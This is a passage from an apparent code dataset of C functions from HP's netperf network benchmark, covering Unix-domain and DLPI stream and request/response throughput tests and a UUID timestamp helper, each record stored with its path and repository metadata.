message_int_ptr++;\n    }\n    for (i = 0; i < loc_clean_count; i++) {\n      loc_dirty_count = *message_int_ptr;\n      message_int_ptr++;\n    }\n#endif /* DIRTY */\n\n    if((putmsg(send_descriptor,\n\t       0,\n\t       &send_message,\n\t       0)) != 0) {\n      if (errno == EINTR)\n\tbreak;\n      perror(\"netperf: data send error\");\n      exit(1);\n    }\n    send_ring = send_ring->next;\n    send_message.buf = send_ring->buffer_ptr;\n#ifdef WANT_INTERVALS\n    for (interval_count = 0;\n\t interval_count < interval_wate;\n\t interval_count++);\n#endif /* WANT_INTERVALS */\n\n    if (debug > 4) {\n      fprintf(where,\"netperf: send_clpi_co_stream: putmsg called \");\n      fprintf(where,\"len is %d\\n\",send_message.len);\n      fflush(where);\n    }\n\n    nummessages++;\n    if (bytes_remaining) {\n      bytes_remaining -= send_size;\n    }\n  }\n\n  /* The test is over. Flush the buffers to the remote end. We do a */\n  /* graceful release to insure that all data has been taken by the */\n  /* remote. this needs a little work - there is no three-way */\n  /* handshake with type two as there is with TCP, so there really */\n  /* should be a message exchange here. however, we will finesse it by */\n  /* saying that the tests shoudl run for a while. */\n\n  if (debug) {\n    fprintf(where,\"sending test end signal \\n\");\n    fflush(where);\n  }\n\n  send_message.len = (send_size - 1);\n  if (send_message.len == 0) send_message.len = 2;\n\n  if((putmsg(send_descriptor,\n\t     0,\n\t     &send_message,\n\t     0)) != 0) {\n    perror(\"netperf: data send error\");\n    exit(1);\n  }\n\n  /* this call will always give us the elapsed time for the test, and */\n  /* will also store-away the necessaries for cpu utilization */\n\n  cpu_stop(local_cpu_usage,&elapsed_time);\t/* was cpu being measured? */\n  /* how long did we really run? */\n\n  /* Get the statistics from the remote end. The remote will have */\n  /* calculated service demand and all those interesting things. If it */\n  /* wasn't supposed to care, it will return obvious values. */\n\n  recv_response();\n  if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote results obtained\\n\");\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: remote error\");\n\n    exit(1);\n  }\n\n  /* We now calculate what our thruput was for the test. In the future, */\n  /* we may want to include a calculation of the thruput measured by */\n  /* the remote, but it should be the case that for a TCP stream test, */\n  /* that the two numbers should be *very* close... We calculate */\n  /* bytes_sent regardless of the way the test length was controlled. */\n  /* If it was time, we needed to, and if it was by bytes, the user may */\n  /* have specified a number of bytes that wasn't a multiple of the */\n  /* send_size, so we really didn't send what he asked for ;-) */\n\n  bytes_sent\t= ((double) send_size * (double) nummessages) + (double) len;\n  thruput\t\t= calc_thruput(bytes_sent);\n\n  if (local_cpu_usage || remote_cpu_usage) {\n    /* We must now do a little math for service demand and cpu */\n    /* utilization for the system(s) */\n    /* Of course, some of the information might be bogus because */\n    /* there was no idle counter in the kernel(s). We need to make */\n    /* a note of this for the user's benefit...*/\n    if (local_cpu_usage) {\n      if (local_cpu_rate == 0.0) {\n\tfprintf(where,\n\t\t\"WARNING WARNING WARNING  WARNING WARNING WARNING  WARNING!\\n\");\n\tfprintf(where,\n\t\t\"Local CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      local_cpu_utilization\t= calc_cpu_util(0.0);\n      local_service_demand\t= calc_service_demand(bytes_sent,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      0);\n    }\n    else {\n      local_cpu_utilization\t= -1.0;\n      local_service_demand\t= -1.0;\n    }\n\n    if (remote_cpu_usage) {\n      if (remote_cpu_rate == 0.0) {\n\tfprintf(where,\n\t\t\"DANGER   DANGER  DANGER   DANGER   DANGER  DANGER   DANGER!\\n\");\n\tfprintf(where,\n\t\t\"Remote CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      remote_cpu_utilization\t= dlpi_co_stream_result->cpu_util;\n      remote_service_demand\t= calc_service_demand(bytes_sent,\n\t\t\t\t\t\t      0.0,\n\t\t\t\t\t\t      remote_cpu_utilization,\n\t\t\t\t\t\t      dlpi_co_stream_result->num_cpus);\n    }\n    else {\n      remote_cpu_utilization = -1.0;\n      remote_service_demand  = -1.0;\n    }\n\n    /* We are now ready to print all the information. If the user */\n    /* has specified zero-level verbosity, we will just print the */\n    /* local service demand, or the remote service demand. If the */\n    /* user has requested verbosity level 1, he will get the basic */\n    /* \"streamperf\" numbers. If the user has specified a verbosity */\n    /* of greater than 1, we will display a veritable plethora of */\n    /* background information from outside of this block as it it */\n    /* not cpu_measurement specific...  */\n\n    switch (verbosity) {\n    case 0:\n      if (local_cpu_usage) {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tlocal_service_demand);\n      }\n      else {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tremote_service_demand);\n      }\n      break;\n    case 1:\n    case 2:\n      fprintf(where,\n\t      cpu_fmt_1,\t\t/* the format string */\n\t      rrw_size,\t\t/* remote recvbuf size */\n\t      lsw_size,\t\t/* local sendbuf size */\n\t      send_size,\t\t/* how large were the sends */\n\t      elapsed_time,\t\t/* how long was the test */\n\t      thruput, \t\t/* what was the xfer rate */\n\t      local_cpu_utilization,\t/* local cpu */\n\t      remote_cpu_utilization,\t/* remote cpu */\n\t      local_service_demand,\t/* local service demand */\n\t      remote_service_demand);\t/* remote service demand */\n      break;\n    }\n  }\n  else {\n    /* The tester did not wish to measure service demand. */\n    switch (verbosity) {\n    case 0:\n      fprintf(where,\n\t      tput_fmt_0,\n\t      thruput);\n      break;\n    case 1:\n    case 2:\n      fprintf(where,\n\t      tput_fmt_1,\t\t/* the format string */\n\t      rrw_size, \t\t/* remote recvbuf size */\n\t      lsw_size, \t\t/* local sendbuf size */\n\t      send_size,\t\t/* how large were the sends */\n\t      elapsed_time, \t\t/* how long did it take */\n\t      thruput);/* how fast did it go */\n      break;\n    }\n  }\n\n  /* it would be a good thing to include information about some of the */\n  /* other parameters that may have been set for this test, but at the */\n  /* moment, I do not wish to figure-out all the  formatting, so I will */\n  /* just put this comment here to help remind me that it is something */\n  /* that should be done at a later time. */\n\n  if (verbosity > 1) {\n    /* The user wanted to know it all, so we will give it to him. */\n    /* This information will include as much as we can find about */\n    /* TCP statistics, the alignments of the sends and receives */\n    /* and all that sort of rot... */\n\n    fprintf(where,\n\t    ksink_fmt,\n\t    \"Bytes\",\n\t    \"Bytes\",\n\t    \"Bytes\",\n\t    local_send_align,\n\t    remote_recv_align,\n\t    local_send_offset,\n\t    remote_recv_offset,\n\t    bytes_sent,\n\t    bytes_sent / (double)nummessages,\n\t    nummessages,\n\t    bytes_sent / (double)dlpi_co_stream_result->recv_calls,\n\t    dlpi_co_stream_result->recv_calls);\n  }\n\n}", "path": "netperf/src/nettest_dlpi.c", "commit_date": "2012-06-19 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* get-current_time -- get time as 60-bit 100ns ticks since UUID epoch.\n   Compensate for the fact that real clock resolution is\n   less than 100ns. */\n", "func_signal": "static void get_current_time(uuid_time_t *timestamp)", "code": "{\n  static int inited = 0;\n  static uuid_time_t time_last;\n  static uint16_t uuids_this_tick;\n  uuid_time_t time_now;\n\n  if (!inited) {\n    get_system_time(&time_now);\n    uuids_this_tick = UUIDS_PER_TICK;\n    inited = 1;\n  }\n\n  for ( ; ; ) {\n    get_system_time(&time_now);\n\n    /* if clock reading changed since last UUID generated, */\n    if (time_last != time_now) {\n      /* reset count of uuids gen'd with this clock reading */\n      uuids_this_tick = 0;\n      time_last = time_now;\n      break;\n    }\n    if (uuids_this_tick < UUIDS_PER_TICK) {\n      uuids_this_tick++;\n      break;\n    }\n    /* going too fast for our clock; spin */\n  }\n  /* add the count of uuids to low order bits of the clock reading */\n  *timestamp = time_now + uuids_this_tick;\n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* this routine implements the sending (netperf) side of the STREAM_RR\n   test. */\n", "func_signal": "void\nsend_stream_rr(char remote_host[])", "code": "{\n\n  char *tput_title = \"\\\nLocal /Remote\\n\\\nSocket Size   Request  Resp.   Elapsed  Trans.\\n\\\nSend   Recv   Size     Size    Time     Rate         \\n\\\nbytes  Bytes  bytes    bytes   secs.    per sec   \\n\\n\";\n\n  char *tput_fmt_0 =\n    \"%7.2f\\n\";\n\n  char *tput_fmt_1_line_1 = \"\\\n%-6d %-6d %-6d   %-6d  %-6.2f   %7.2f   \\n\";\n  char *tput_fmt_1_line_2 = \"\\\n%-6d %-6d\\n\";\n\n  char *cpu_title = \"\\\nLocal /Remote\\n\\\nSocket Size   Request Resp.  Elapsed Trans.   CPU    CPU    S.dem   S.dem\\n\\\nSend   Recv   Size    Size   Time    Rate     local  remote local   remote\\n\\\nbytes  bytes  bytes   bytes  secs.   per sec  %%      %%      us/Tr   us/Tr\\n\\n\";\n\n  char *cpu_fmt_0 =\n    \"%6.3f\\n\";\n\n  char *cpu_fmt_1_line_1 = \"\\\n%-6d %-6d %-6d  %-6d %-6.2f  %-6.2f   %-6.2f %-6.2f %-6.3f  %-6.3f\\n\";\n\n  char *cpu_fmt_1_line_2 = \"\\\n%-6d %-6d\\n\";\n\n  char *ksink_fmt = \"\\\nAlignment      Offset\\n\\\nLocal  Remote  Local  Remote\\n\\\nSend   Recv    Send   Recv\\n\\\n%5d  %5d   %5d  %5d\\n\";\n\n\n  int\t\t\ttimed_out = 0;\n  float\t\t\telapsed_time;\n\n  int\tlen;\n  char\t*temp_message_ptr;\n  int\tnummessages;\n  SOCKET send_socket;\n  int\ttrans_remaining;\n  double\tbytes_xferd;\n\n  struct ring_elt *send_ring;\n  struct ring_elt *recv_ring;\n\n  int\trsp_bytes_left;\n  int\trsp_bytes_recvd;\n\n  float\tlocal_cpu_utilization;\n  float\tlocal_service_demand;\n  float\tremote_cpu_utilization;\n  float\tremote_service_demand;\n  double\tthruput;\n\n  struct\tsockaddr_un\tserver;\n\n  struct\tstream_rr_request_struct\t*stream_rr_request;\n  struct\tstream_rr_response_struct\t*stream_rr_response;\n  struct\tstream_rr_results_struct\t*stream_rr_result;\n\n  stream_rr_request =\n    (struct stream_rr_request_struct *)netperf_request.content.test_specific_data;\n  stream_rr_response=\n    (struct stream_rr_response_struct *)netperf_response.content.test_specific_data;\n  stream_rr_result\t=\n    (struct stream_rr_results_struct *)netperf_response.content.test_specific_data;\n\n  /* since we are now disconnected from the code that established the\n     control socket, and since we want to be able to use different\n     protocols and such, we are passed the name of the remote host and\n     must turn that into the test specific addressing information. */\n\n  bzero((char *)&server,\n\tsizeof(server));\n\n  server.sun_family = AF_UNIX;\n\n\n  if ( print_headers ) {\n    fprintf(where,\"STREAM REQUEST/RESPONSE TEST\\n\");\n    if (local_cpu_usage || remote_cpu_usage)\n      fprintf(where,cpu_title,format_units());\n    else\n      fprintf(where,tput_title,format_units());\n  }\n\n  /* initialize a few counters */\n\n  nummessages\t=\t0;\n  bytes_xferd\t=\t0.0;\n  times_up \t= \t0;\n\n  /* set-up the data buffers with the requested alignment and offset.\n     since this is a request/response test, default the send_width and\n     recv_width to 1 and not two raj 7/94 */\n\n  if (send_width == 0) send_width = 1;\n  if (recv_width == 0) recv_width = 1;\n\n  send_ring = allocate_buffer_ring(send_width,\n\t\t\t\t   req_size,\n\t\t\t\t   local_send_align,\n\t\t\t\t   local_send_offset);\n\n  recv_ring = allocate_buffer_ring(recv_width,\n\t\t\t\t   rsp_size,\n\t\t\t\t   local_recv_align,\n\t\t\t\t   local_recv_offset);\n\n  /*set up the data socket                        */\n  send_socket = create_unix_socket(AF_UNIX,\n\t\t\t\t   SOCK_STREAM);\n\n  if (send_socket == INVALID_SOCKET){\n    perror(\"netperf: send_stream_rr: stream stream data socket\");\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"send_stream_rr: send_socket obtained...\\n\");\n  }\n\n  /* If the user has requested cpu utilization measurements, we must\n     calibrate the cpu(s). We will perform this task within the tests\n     themselves. If the user has specified the cpu rate, then\n     calibrate_local_cpu will return rather quickly as it will have\n     nothing to do. If local_cpu_rate is zero, then we will go through\n     all the \"normal\" calibration stuff and return the rate back.*/\n\n  if (local_cpu_usage) {\n    local_cpu_rate = calibrate_local_cpu(local_cpu_rate);\n  }\n\n  /* Tell the remote end to do a listen. The server alters the socket\n     paramters on the other side at this point, hence the reason for\n     all the values being passed in the setup message. If the user did\n     not specify any of the parameters, they will be passed as 0,\n     which will indicate to the remote that no changes beyond the\n     system's default should be used. Alignment is the exception, it\n     will default to 8, which will be no alignment alterations. */\n\n  netperf_request.content.request_type\t=\tDO_STREAM_RR;\n  stream_rr_request->recv_buf_size\t=\trsr_size;\n  stream_rr_request->send_buf_size\t=\trss_size;\n  stream_rr_request->recv_alignment=\tremote_recv_align;\n  stream_rr_request->recv_offset\t=\tremote_recv_offset;\n  stream_rr_request->send_alignment=\tremote_send_align;\n  stream_rr_request->send_offset\t=\tremote_send_offset;\n  stream_rr_request->request_size\t=\treq_size;\n  stream_rr_request->response_size\t=\trsp_size;\n  stream_rr_request->measure_cpu\t=\tremote_cpu_usage;\n  stream_rr_request->cpu_rate\t=\tremote_cpu_rate;\n  if (test_time) {\n    stream_rr_request->test_length\t=\ttest_time;\n  }\n  else {\n    stream_rr_request->test_length\t=\ttest_trans * -1;\n  }\n\n  if (debug > 1) {\n    fprintf(where,\"netperf: send_stream_rr: requesting STREAM rr test\\n\");\n  }\n\n  send_request();\n\n  /* The response from the remote will contain all of the relevant\n     socket parameters for this test type. We will put them back into\n     the variables here so they can be displayed if desired.  The\n     remote will have calibrated CPU if necessary, and will have done\n     all the needed set-up we will have calibrated the cpu locally\n     before sending the request, and will grab the counter value right\n     after the connect returns. The remote will grab the counter right\n     after the accept call. This saves the hassle of extra messages\n     being sent for the STREAM tests.  */\n\n  recv_response();\n\n  if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote listen done.\\n\");\n    rsr_size\t=\tstream_rr_response->recv_buf_size;\n    rss_size\t=\tstream_rr_response->send_buf_size;\n    remote_cpu_usage=\tstream_rr_response->measure_cpu;\n    remote_cpu_rate = \tstream_rr_response->cpu_rate;\n    /* make sure that port numbers are in network order */\n    strcpy(server.sun_path,stream_rr_response->unix_path);\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: remote error\");\n\n    exit(1);\n  }\n\n  /*Connect up to the remote port on the data socket  */\n  if (connect(send_socket,\n\t      (struct sockaddr *)&server,\n\t      sizeof(server)) == INVALID_SOCKET){\n    perror(\"netperf: data socket connect failed\");\n\n    exit(1);\n  }\n\n  /* Data Socket set-up is finished. If there were problems, either\n     the connect would have failed, or the previous response would\n     have indicated a problem. I failed to see the value of the extra\n     message after the accept on the remote. If it failed, we'll see\n     it here. If it didn't, we might as well start pumping data. */\n\n  /* Set-up the test end conditions. For a request/response test, they\n     can be either time or transaction based. */\n\n  if (test_time) {\n    /* The user wanted to end the test after a period of time. */\n    times_up = 0;\n    trans_remaining = 0;\n    start_timer(test_time);\n  }\n  else {\n    /* The tester wanted to send a number of bytes. */\n    trans_remaining = test_bytes;\n    times_up = 1;\n  }\n\n  /* The cpu_start routine will grab the current time and possibly\n     value of the idle counter for later use in measuring cpu\n     utilization and/or service demand and thruput. */\n\n  cpu_start(local_cpu_usage);\n\n  /* We use an \"OR\" to control test execution. When the test is\n     controlled by time, the byte count check will always return\n     false.  When the test is controlled by byte count, the time test\n     will always return false. When the test is finished, the whole\n     expression will go false and we will stop sending data. I think I\n     just arbitrarily decrement trans_remaining for the timed test,\n     but will not do that just yet... One other question is whether or\n     not the send buffer and the receive buffer should be the same\n     buffer. */\n\n  while ((!times_up) || (trans_remaining > 0)) {\n    /* send the request. we assume that if we use a blocking socket,\n       the request will be sent at one shot. */\n    if((len=send(send_socket,\n\t\t send_ring->buffer_ptr,\n\t\t req_size,\n\t\t 0)) != req_size) {\n      if (errno == EINTR) {\n\t/* we hit the end of a timed test. */\n\ttimed_out = 1;\n\tbreak;\n      }\n      perror(\"send_stream_rr: data send error\");\n      exit(1);\n    }\n    send_ring = send_ring->next;\n\n    /* receive the response */\n    rsp_bytes_left = rsp_size;\n    temp_message_ptr  = recv_ring->buffer_ptr;\n    while(rsp_bytes_left > 0) {\n      if((rsp_bytes_recvd=recv(send_socket,\n\t\t\t       temp_message_ptr,\n\t\t\t       rsp_bytes_left,\n\t\t\t       0)) == SOCKET_ERROR) {\n\tif (errno == EINTR) {\n\t  /* We hit the end of a timed test. */\n\t  timed_out = 1;\n\t  break;\n\t}\n\tperror(\"send_stream_rr: data recv error\");\n\texit(1);\n      }\n      rsp_bytes_left -= rsp_bytes_recvd;\n      temp_message_ptr  += rsp_bytes_recvd;\n    }\n    recv_ring = recv_ring->next;\n\n    if (timed_out) {\n      /* we may have been in a nested while loop - we need\n         another call to break. */\n      break;\n    }\n\n    nummessages++;\n    if (trans_remaining) {\n      trans_remaining--;\n    }\n\n    if (debug > 3) {\n      fprintf(where,\n\t      \"Transaction %d completed\\n\",\n\t      nummessages);\n      fflush(where);\n    }\n  }\n\n  /* At this point we used to call shutdown on the data socket to be\n     sure all the data was delivered, but this was not germane in a\n     request/response test, and it was causing the tests to \"hang\"\n     when they were being controlled by time. So, I have replaced this\n     shutdown call with a call to close that can be found later in the\n     procedure. */\n\n  /* this call will always give us the elapsed time for the test, and\n     will also store-away the necessaries for cpu utilization */\n\n  cpu_stop(local_cpu_usage,&elapsed_time);\t/* was cpu being\n\t\t\t\t\t\t   measured? how long\n\t\t\t\t\t\t   did we really\n\t\t\t\t\t\t   run? */\n\n  /* Get the statistics from the remote end. The remote will have\n     calculated service demand and all those interesting things. If it\n     wasn't supposed to care, it will return obvious values. */\n\n  recv_response();\n  if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote results obtained\\n\");\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: remote error\");\n\n    exit(1);\n  }\n\n  /* We now calculate what our thruput was for the test. In the\n     future, we may want to include a calculation of the thruput\n     measured by the remote, but it should be the case that for a\n     STREAM stream test, that the two numbers should be *very*\n     close... We calculate bytes_sent regardless of the way the test\n     length was controlled.  If it was time, we needed to, and if it\n     was by bytes, the user may have specified a number of bytes that\n     wasn't a multiple of the send_size, so we really didn't send what\n     he asked for ;-) We use Kbytes/s as the units of thruput for a\n     STREAM stream test, where K = 1024. A future enhancement *might*\n     be to choose from a couple of unit selections. */\n\n  bytes_xferd\t= (req_size * nummessages) + (rsp_size * nummessages);\n  thruput\t= calc_thruput(bytes_xferd);\n\n  if (local_cpu_usage || remote_cpu_usage) {\n    /* We must now do a little math for service demand and cpu\n       utilization for the system(s) Of course, some of the\n       information might be bogus because there was no idle counter in\n       the kernel(s). We need to make a note of this for the user's\n       benefit...*/\n    if (local_cpu_usage) {\n      if (local_cpu_rate == 0.0) {\n\tfprintf(where,\"WARNING WARNING WARNING  WARNING WARNING WARNING  WARNING!\\n\");\n\tfprintf(where,\"Local CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      local_cpu_utilization = calc_cpu_util(0.0);\n      /* since calc_service demand is doing ms/Kunit we will multiply\n         the number of transaction by 1024 to get \"good\" numbers */\n      local_service_demand  = calc_service_demand((double) nummessages*1024,\n\t\t\t\t\t\t  0.0,\n\t\t\t\t\t\t  0.0,\n\t\t\t\t\t\t  0);\n    }\n    else {\n      local_cpu_utilization\t= -1.0;\n      local_service_demand\t= -1.0;\n    }\n\n    if (remote_cpu_usage) {\n      if (remote_cpu_rate == 0.0) {\n\tfprintf(where,\"DANGER  DANGER  DANGER    DANGER  DANGER  DANGER    DANGER!\\n\");\n\tfprintf(where,\"Remote CPU usage numbers based on process information only!\\n\");\n\tfflush(where);\n      }\n      remote_cpu_utilization = stream_rr_result->cpu_util;\n      /* since calc_service demand is doing ms/Kunit we will multiply\n         the number of transaction by 1024 to get \"good\" numbers */\n      remote_service_demand = calc_service_demand((double) nummessages*1024,\n\t\t\t\t\t\t  0.0,\n\t\t\t\t\t\t  remote_cpu_utilization,\n\t\t\t\t\t\t  stream_rr_result->num_cpus);\n    }\n    else {\n      remote_cpu_utilization = -1.0;\n      remote_service_demand  = -1.0;\n    }\n\n    /* We are now ready to print all the information. If the user has\n       specified zero-level verbosity, we will just print the local\n       service demand, or the remote service demand. If the user has\n       requested verbosity level 1, he will get the basic \"streamperf\"\n       numbers. If the user has specified a verbosity of greater than\n       1, we will display a veritable plethora of background\n       information from outside of this block as it it not\n       cpu_measurement specific...  */\n\n    switch (verbosity) {\n    case 0:\n      if (local_cpu_usage) {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tlocal_service_demand);\n      }\n      else {\n\tfprintf(where,\n\t\tcpu_fmt_0,\n\t\tremote_service_demand);\n      }\n      break;\n    case 1:\n      fprintf(where,\n\t      cpu_fmt_1_line_1,\t\t/* the format string */\n\t      lss_size,\t\t/* local sendbuf size */\n\t      lsr_size,\n\t      req_size,\t\t/* how large were the requests */\n\t      rsp_size,\t\t/* guess */\n\t      elapsed_time,\t\t/* how long was the test */\n\t      nummessages/elapsed_time,\n\t      local_cpu_utilization,\t/* local cpu */\n\t      remote_cpu_utilization,\t/* remote cpu */\n\t      local_service_demand,\t/* local service demand */\n\t      remote_service_demand);\t/* remote service demand */\n      fprintf(where,\n\t      cpu_fmt_1_line_2,\n\t      rss_size,\n\t      rsr_size);\n      break;\n    }\n  }\n  else {\n    /* The tester did not wish to measure service demand. */\n    switch (verbosity) {\n    case 0:\n      fprintf(where,\n\t      tput_fmt_0,\n\t      nummessages/elapsed_time);\n      break;\n    case 1:\n      fprintf(where,\n\t      tput_fmt_1_line_1,\t/* the format string */\n\t      lss_size,\n\t      lsr_size,\n\t      req_size,\t\t/* how large were the requests */\n\t      rsp_size,\t\t/* how large were the responses */\n\t      elapsed_time, \t\t/* how long did it take */\n\t      nummessages/elapsed_time);\n      fprintf(where,\n\t      tput_fmt_1_line_2,\n\t      rss_size, \t\t/* remote recvbuf size */\n\t      rsr_size);\n\n      break;\n    }\n  }\n\n  /* it would be a good thing to include information about some of the\n     other parameters that may have been set for this test, but at the\n     moment, I do not wish to figure-out all the formatting, so I will\n     just put this comment here to help remind me that it is something\n     that should be done at a later time. */\n\n  if (verbosity > 1) {\n    /* The user wanted to know it all, so we will give it to him.\n       This information will include as much as we can find about\n       STREAM statistics, the alignments of the sends and receives and\n       all that sort of rot... */\n\n    fprintf(where,\n    \t    \"%s\",\n\t    ksink_fmt);\n  }\n  /* The test is over. Kill the data socket */\n\n  if (close(send_socket) == -1) {\n    perror(\"send_stream_rr: cannot shutdown stream stream socket\");\n  }\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* this routine implements the receive side (netserver) of the\n    DG_STREAM performance test. */\n", "func_signal": "void\nrecv_dg_stream()", "code": "{\n  struct ring_elt *recv_ring;\n\n  struct sockaddr_un myaddr_un;\n  SOCKET s_data;\n  int\tlen = 0;\n  int\tbytes_received = 0;\n  float\telapsed_time;\n\n  int\tmessage_size;\n  int\tmessages_recvd = 0;\n\n  struct\tdg_stream_request_struct\t*dg_stream_request;\n  struct\tdg_stream_response_struct\t*dg_stream_response;\n  struct\tdg_stream_results_struct\t*dg_stream_results;\n\n  dg_stream_request  =\n    (struct dg_stream_request_struct *)netperf_request.content.test_specific_data;\n  dg_stream_response =\n    (struct dg_stream_response_struct *)netperf_response.content.test_specific_data;\n  dg_stream_results  =\n    (struct dg_stream_results_struct *)netperf_response.content.test_specific_data;\n\n  if (debug) {\n    fprintf(where,\"netserver: recv_dg_stream: entered...\\n\");\n    fflush(where);\n  }\n\n  /* We want to set-up the listen socket with all the desired\n     parameters and then let the initiator know that all is ready. If\n     socket size defaults are to be used, then the initiator will have\n     sent us 0's. If the socket sizes cannot be changed, then we will\n     send-back what they are. If that information cannot be\n     determined, then we send-back -1's for the sizes. If things go\n     wrong for any reason, we will drop back ten yards and punt. */\n\n  /* If anything goes wrong, we want the remote to know about it. It\n     would be best if the error that the remote reports to the user is\n     the actual error we encountered, rather than some bogus\n     unexpected response type message. */\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dg_stream: setting the response type...\\n\");\n    fflush(where);\n  }\n\n  netperf_response.content.response_type = DG_STREAM_RESPONSE;\n\n  if (debug > 2) {\n    fprintf(where,\"recv_dg_stream: the response type is set...\\n\");\n    fflush(where);\n  }\n\n  /* We now alter the message_ptr variable to be at the desired\n     alignment with the desired offset. */\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dg_stream: requested alignment of %d\\n\",\n\t    dg_stream_request->recv_alignment);\n    fflush(where);\n  }\n\n  if (recv_width == 0) recv_width = 1;\n\n  recv_ring = allocate_buffer_ring(recv_width,\n\t\t\t\t   dg_stream_request->message_size,\n\t\t\t\t   dg_stream_request->recv_alignment,\n\t\t\t\t   dg_stream_request->recv_offset);\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dg_stream: receive alignment and offset set...\\n\");\n    fflush(where);\n  }\n\n  /* Let's clear-out our sockaddr for the sake of cleanlines. Then we\n     can put in OUR values !-) At some point, we may want to nail this\n     socket to a particular network-level address, but for now,\n     INADDR_ANY should be just fine. */\n\n  bzero((char *)&myaddr_un,\n\tsizeof(myaddr_un));\n  myaddr_un.sun_family      = AF_UNIX;\n\n  /* Grab a socket to listen on, and then listen on it. */\n\n  if (debug > 1) {\n    fprintf(where,\"recv_dg_stream: grabbing a socket...\\n\");\n    fflush(where);\n  }\n\n  /* create_unix_socket expects to find some things in the global\n     variables, so set the globals based on the values in the request.\n     once the socket has been created, we will set the response values\n     based on the updated value of those globals. raj 7/94 */\n  lsr_size = dg_stream_request->recv_buf_size;\n\n  s_data = create_unix_socket(AF_UNIX,\n\t\t\t      SOCK_DGRAM);\n\n  if (s_data == INVALID_SOCKET) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  /* Let's get an address assigned to this socket so we can tell the\n     initiator how to reach the data socket. There may be a desire to\n     nail this socket to a specific IP address in a multi-homed,\n     multi-connection situation, but for now, we'll ignore the issue\n     and concentrate on single connection testing. */\n\n  strcpy(myaddr_un.sun_path,tempnam(path_prefix,\"netperf.\"));\n  if (bind(s_data,\n\t   (struct sockaddr *)&myaddr_un,\n\t   sizeof(myaddr_un)) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  chmod(myaddr_un.sun_path, 0666);\n\n  dg_stream_response->test_length = dg_stream_request->test_length;\n\n  /* Now myaddr_un contains the port and the internet address this is\n     returned to the sender also implicitly telling the sender that\n     the socket buffer sizing has been done. */\n\n  strcpy(dg_stream_response->unix_path,myaddr_un.sun_path);\n  netperf_response.content.serv_errno   = 0;\n\n  /* But wait, there's more. If the initiator wanted cpu measurements,\n     then we must call the calibrate routine, which will return the\n     max rate back to the initiator. If the CPU was not to be\n     measured, or something went wrong with the calibration, we will\n     return a -1 to the initiator. */\n\n  dg_stream_response->cpu_rate = 0.0; \t/* assume no cpu */\n  if (dg_stream_request->measure_cpu) {\n    /* We will pass the rate into the calibration routine. If the user\n       did not specify one, it will be 0.0, and we will do a \"real\"\n       calibration. Otherwise, all it will really do is store it\n       away... */\n    dg_stream_response->measure_cpu = 1;\n    dg_stream_response->cpu_rate =\n      calibrate_local_cpu(dg_stream_request->cpu_rate);\n  }\n\n  message_size\t= dg_stream_request->message_size;\n  test_time\t= dg_stream_request->test_length;\n\n  /* before we send the response back to the initiator, pull some of\n     the socket parms from the globals */\n  dg_stream_response->send_buf_size = lss_size;\n  dg_stream_response->recv_buf_size = lsr_size;\n\n  send_response();\n\n  /* Now it's time to start receiving data on the connection. We will\n     first grab the apropriate counters and then start grabbing. */\n\n  cpu_start(dg_stream_request->measure_cpu);\n\n  /* The loop will exit when the timer pops, or if we happen to recv a\n     message of less than send_size bytes... */\n\n  times_up = 0;\n  start_timer(test_time + PAD_TIME);\n\n  if (debug) {\n    fprintf(where,\"recv_dg_stream: about to enter inner sanctum.\\n\");\n    fflush(where);\n  }\n\n  while (!times_up) {\n    if ((len = recv(s_data,\n\t\t    recv_ring->buffer_ptr,\n\t\t    message_size,\n\t\t    0)) != message_size) {\n      if ((len == SOCKET_ERROR) && (errno != EINTR)) {\n\tnetperf_response.content.serv_errno = errno;\n\tsend_response();\n\texit(1);\n      }\n      break;\n    }\n    messages_recvd++;\n    recv_ring = recv_ring->next;\n  }\n\n  if (debug) {\n    fprintf(where,\"recv_dg_stream: got %d messages.\\n\",messages_recvd);\n    fflush(where);\n  }\n\n\n  /* The loop now exits due timer or < send_size bytes received. */\n\n  cpu_stop(dg_stream_request->measure_cpu,&elapsed_time);\n\n  if (times_up) {\n    /* we ended on a timer, subtract the PAD_TIME */\n    elapsed_time -= (float)PAD_TIME;\n  }\n  else {\n    stop_timer();\n  }\n\n  if (debug) {\n    fprintf(where,\"recv_dg_stream: test ended in %f seconds.\\n\",elapsed_time);\n    fflush(where);\n  }\n\n\n  /* We will count the \"off\" message that got us out of the loop */\n  bytes_received = (messages_recvd * message_size) + len;\n\n  /* send the results to the sender\t\t\t*/\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_dg_stream: got %d bytes\\n\",\n\t    bytes_received);\n    fflush(where);\n  }\n\n  netperf_response.content.response_type\t\t= DG_STREAM_RESULTS;\n  dg_stream_results->bytes_received\t= bytes_received;\n  dg_stream_results->messages_recvd\t= messages_recvd;\n  dg_stream_results->elapsed_time\t= elapsed_time;\n  if 